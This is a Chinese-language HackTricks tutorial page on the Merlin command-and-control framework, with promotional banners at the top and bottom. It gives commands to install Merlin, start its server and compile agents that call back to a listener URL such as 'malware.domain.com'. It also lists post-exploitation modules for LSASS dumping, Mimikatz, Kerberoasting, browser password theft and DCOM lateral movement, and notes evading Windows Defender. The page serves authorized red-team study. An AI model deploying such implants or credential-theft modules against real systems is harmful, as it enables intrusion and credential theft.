<details>

<summary><strong>零基础学习AWS黑客攻击成为高手</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS红队专家)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks上看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在**Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>


# 安装

## 安装GO
```
#Download GO package from: https://golang.org/dl/
#Decompress the packe using:
tar -C /usr/local -xzf go$VERSION.$OS-$ARCH.tar.gz

#Change /etc/profile
Add ":/usr/local/go/bin" to PATH
Add "export GOPATH=$HOME/go"
Add "export GOBIN=$GOPATH/bin"

source /etc/profile
```
## 安装 Merlin
```
go get https://github.com/Ne0nd0g/merlin/tree/dev #It is recommended to use the developer branch
cd $GOPATH/src/github.com/Ne0nd0g/merlin/
```
# 启动 Merlin 服务器
```
go run cmd/merlinserver/main.go -i
```
# Merlin 代理

您可以[下载预编译的代理](https://github.com/Ne0nd0g/merlin/releases)

## 编译代理

转到主文件夹 _$GOPATH/src/github.com/Ne0nd0g/merlin/_
```
#User URL param to set the listener URL
make #Server and Agents of all
make windows #Server and Agents for Windows
make windows-agent URL=https://malware.domain.com:443/ #Agent for windows (arm, dll, linux, darwin, javascript, mips)
```
## **手动编译代理**
```
GOOS=windows GOARCH=amd64 go build -ldflags "-X main.url=https://10.2.0.5:443" -o agent.exe main.g
```
# 模块

**坏消息是，Merlin 使用的每个模块都是从源头（Github）下载并在使用前保存到磁盘的。使用知名模块时要小心，因为 Windows Defender 会抓到你！**


**SafetyKatz** --> 修改版 Mimikatz。转储 LSASS 到文件并启动：sekurlsa::logonpasswords 到该文件\
**SharpDump** --> 为指定的进程 ID 创建 minidump（默认为 LSASS）（它说最终文件的扩展名是 .gz，但实际上是 .bin，但是一个 gz 文件）\
**SharpRoast** --> Kerberoast（不工作）\
**SeatBelt** --> CS 中的本地安全测试（不工作） https://github.com/GhostPack/Seatbelt/blob/master/Seatbelt/Program.cs\
**Compiler-CSharp** --> 使用 csc.exe /unsafe 编译\
**Sharp-Up** -->C# 中的所有检查在 powerup 中（工作）\
**Inveigh** --> PowerShell ADIDNS/LLMNR/mDNS/NBNS 欺骗器和中间人工具（不工作，需要加载：https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1）\
**Invoke-InternalMonologue** --> 冒充所有可用用户并检索每个用户的挑战响应（每个用户的 NTLM 哈希）（错误的 url）\
**Invoke-PowerThIEf** --> 从 IExplorer 偷窃表单或使其执行 JS 或在该进程中注入 DLL（不工作）（PS 看起来也不工作） https://github.com/nettitude/Invoke-PowerThIEf/blob/master/Invoke-PowerThIEf.ps1\
**LaZagneForensic** --> 获取浏览器密码（工作但不打印输出目录）\
**dumpCredStore** --> Win32 凭据管理器 API（https://github.com/zetlen/clortho/blob/master/CredMan.ps1） https://www.digitalcitizen.life/credential-manager-where-windows-stores-passwords-other-login-details\
**Get-InjectedThread** --> 检测运行中进程的经典注入（经典注入（OpenProcess，VirtualAllocEx，WriteProcessMemory，CreateRemoteThread））（不工作）\
**Get-OSTokenInformation** --> 获取运行中进程和线程的令牌信息（用户，组，权限，所有者... https://docs.microsoft.com/es-es/windows/desktop/api/winnt/ne-winnt-\_token_information_class）\
**Invoke-DCOM** --> 通过 DCOM 在其他计算机上执行命令（http://www.enigma0x3.net.）（https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/）\
**Invoke-DCOMPowerPointPivot** --> 在其他 PC 上利用 PowerPoint COM 对象执行命令（ADDin）\
**Invoke-ExcelMacroPivot** --> 在其他 PC 上利用 DCOM 在 Excel 中执行命令\
**Find-ComputersWithRemoteAccessPolicies** --> （不工作）（https://labs.mwrinfosecurity.com/blog/enumerating-remote-access-policies-through-gpo/）\
**Grouper** --> 它转储所有最有趣的组策略部分，然后在其中寻找可利用的东西。（已弃用）看看 Grouper2，看起来真的不错\
**Invoke-WMILM** --> WMI 用于横向移动\
**Get-GPPPassword** --> 寻找 groups.xml，scheduledtasks.xml，services.xml 和 datasources.xml 并返回明文密码（域内）\
**Invoke-Mimikatz** --> 使用 mimikatz（默认转储凭据）\
**PowerUp** --> https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc\
**Find-BadPrivilege** --> 检查计算机中用户的权限\
**Find-PotentiallyCrackableAccounts** --> 检索与 SPN 关联的用户账户信息（Kerberoasting）\
**psgetsystem** --> 获取系统

**未检查持久性模块**

# 总结

我真的很喜欢这个工具的感觉和潜力。\
我希望这个工具将开始从服务器下载模块，并在下载脚本时整合某种规避手段。


<details>

<summary><strong>从零开始学习 AWS 黑客攻击直到成为英雄，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

* 如果你想在 **HackTricks** 中看到你的**公司广告**或**下载 HackTricks 的 PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs 集合**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享你的黑客技巧。

</details>
